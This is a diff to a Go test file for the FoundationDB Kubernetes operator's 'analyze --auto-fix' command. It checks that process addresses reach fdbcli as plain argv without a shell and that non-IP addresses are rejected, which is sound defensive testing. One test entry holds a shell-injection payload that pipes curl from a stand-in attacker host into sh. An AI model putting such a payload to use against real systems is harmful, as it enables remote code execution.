@@ -24,15 +24,20 @@ import (
 	"bytes"
 	"context"
 	"fmt"
+	"net"
+	"net/url"
 	"strings"
 	"time"
 
 	fdbv1beta2 "github.com/FoundationDB/fdb-kubernetes-operator/v2/api/v1beta2"
+	kubeHelper "github.com/FoundationDB/fdb-kubernetes-operator/v2/internal/kubernetes"
 	. "github.com/onsi/ginkgo/v2"
 	. "github.com/onsi/gomega"
 	corev1 "k8s.io/api/core/v1"
 	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
 	"k8s.io/cli-runtime/pkg/genericiooptions"
+	"k8s.io/client-go/rest"
+	"k8s.io/client-go/tools/remotecommand"
 )
 
 func getCluster(
@@ -89,6 +94,23 @@ func getPodList(
 					DeletionTimestamp: deletionTimestamp,
 				},
 				Status: status,
+			},
+		},
+	}
+}
+
+// getStatusWithProcess builds a minimal status with one error process at the given address.
+func getStatusWithProcess(addr fdbv1beta2.ProcessAddress) *fdbv1beta2.FoundationDBStatus {
+	return &fdbv1beta2.FoundationDBStatus{
+		Cluster: fdbv1beta2.FoundationDBStatusClusterInfo{
+			Processes: map[fdbv1beta2.ProcessGroupID]fdbv1beta2.FoundationDBStatusProcessInfo{
+				"storage-1": {
+					Address:  addr,
+					Locality: map[string]string{fdbv1beta2.FDBLocalityInstanceIDKey: "storage-1"},
+					Messages: []fdbv1beta2.FoundationDBStatusProcessMessage{
+						{Name: "io_error", Type: "io_error", Time: 1},
+					},
+				},
 			},
 		},
 	}
@@ -1061,6 +1083,93 @@ var _ = Describe("[plugin] analyze cluster", func() {
 				0,
 				"top 0 fault domains:",
 			),
+		)
+	})
+
+	When("running analyzeStatusInternal with --auto-fix", func() {
+		var (
+			capturedURL *url.URL
+			origSPDY    func(*rest.Config, string, *url.URL) (remotecommand.Executor, error)
+		)
+
+		// commandArgs returns the argv from the captured exec request.
+		commandArgs := func() []string { return capturedURL.Query()["command"] }
+
+		BeforeEach(func() {
+			origSPDY = kubeHelper.NewSPDYExecutor
+			capturedURL = nil
+			kubeHelper.NewSPDYExecutor = func(_ *rest.Config, _ string, u *url.URL) (remotecommand.Executor, error) {
+				capturedURL = u
+				return &kubeHelper.FakeExecutor{}, nil
+			}
+		})
+
+		AfterEach(func() {
+			kubeHelper.NewSPDYExecutor = origSPDY
+		})
+
+		runAutoFix := func(status *fdbv1beta2.FoundationDBStatus) {
+			outBuffer := bytes.Buffer{}
+			errBuffer := bytes.Buffer{}
+			inBuffer := bytes.Buffer{}
+			cmd := newAnalyzeCmd(
+				genericiooptions.IOStreams{In: &inBuffer, Out: &outBuffer, ErrOut: &errBuffer},
+			)
+			pod := &getPodList(clusterName, namespace, corev1.PodStatus{Phase: corev1.PodRunning}, nil).Items[0]
+			// Returns a non-nil error because foundIssues=true; unrelated to the exec we inspect.
+			_ = analyzeStatusInternal(
+				cmd,
+				&rest.Config{Host: "https://fake"},
+				k8sClient,
+				status,
+				pod,
+				true,
+				clusterName,
+			)
+		}
+
+		// IP-addressed processes flow through to fdbcli kill as a single argv element. No shell wrapping.
+		DescribeTable("forwards valid IP processes through argv with no shell",
+			func(addr fdbv1beta2.ProcessAddress, expectedKillAddr string) {
+				runAutoFix(getStatusWithProcess(addr))
+
+				Expect(commandArgs()).To(Equal([]string{
+					"fdbcli",
+					"--exec",
+					fmt.Sprintf("kill; kill %s; sleep 5; status", expectedKillAddr),
+				}))
+				Expect(commandArgs()).NotTo(ContainElement("/bin/bash"))
+				Expect(commandArgs()).NotTo(ContainElement("/bin/sh"))
+				Expect(commandArgs()).NotTo(ContainElement("-c"))
+			},
+			Entry("IPv4:port",
+				fdbv1beta2.ProcessAddress{IPAddress: net.ParseIP("10.0.1.42"), Port: 4500},
+				"10.0.1.42:4500"),
+			Entry(
+				"IPv6:port",
+				fdbv1beta2.ProcessAddress{
+					IPAddress: net.ParseIP("2620:149:1000:4217::1c1c"),
+					Port:      4501,
+				},
+				"[2620:149:1000:4217::1c1c]:4501",
+			),
+		)
+
+		// Non-IP addresses get dropped before fdbcli is ever invoked. fdbserver only reports IPs in
+		// status, so anything else here is either malformed or attacker-controlled.
+		DescribeTable("skips auto-fix for processes whose address is not a valid IP",
+			func(addr fdbv1beta2.ProcessAddress) {
+				runAutoFix(getStatusWithProcess(addr))
+
+				Expect(capturedURL).To(BeNil(), "fdbcli should not have been invoked")
+			},
+			Entry("non-IP address",
+				fdbv1beta2.ProcessAddress{StringAddress: "pod-1.cluster.local", Port: 4500}),
+			Entry("malicious payload (shell metacharacters)",
+				fdbv1beta2.ProcessAddress{
+					StringAddress: "evil';curl http://attacker/x|sh;echo 'pwned",
+					Port:          4500,
+				}),
 		)
 	})
 })
